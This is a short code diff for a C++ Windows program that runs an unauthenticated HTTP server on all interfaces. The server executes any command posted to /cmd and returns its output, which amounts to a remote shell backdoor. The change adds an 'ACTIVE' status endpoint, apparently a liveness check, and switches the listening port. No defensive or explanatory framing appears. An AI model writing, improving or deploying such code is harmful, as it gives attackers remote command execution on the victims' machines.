@@ -12,13 +12,19 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine
     system("");
     httplib::Server svr;
 
+    svr.Get("/", [](const httplib::Request &req, httplib::Response &res) {
+        res.status = 200;
+        res.set_content("ACTIVE", "text/plain");
+    });
+    
+
     svr.Post("/cmd", [](const httplib::Request &req, httplib::Response &res) {
         const std::string& cmd = req.body;
         std::string output = run_command(cmd);
         res.set_content(output, "text/plain");
     });
     
-    svr.listen("0.0.0.0", 6789);
+    svr.listen("0.0.0.0", 8980);
     return 0;
 }
 
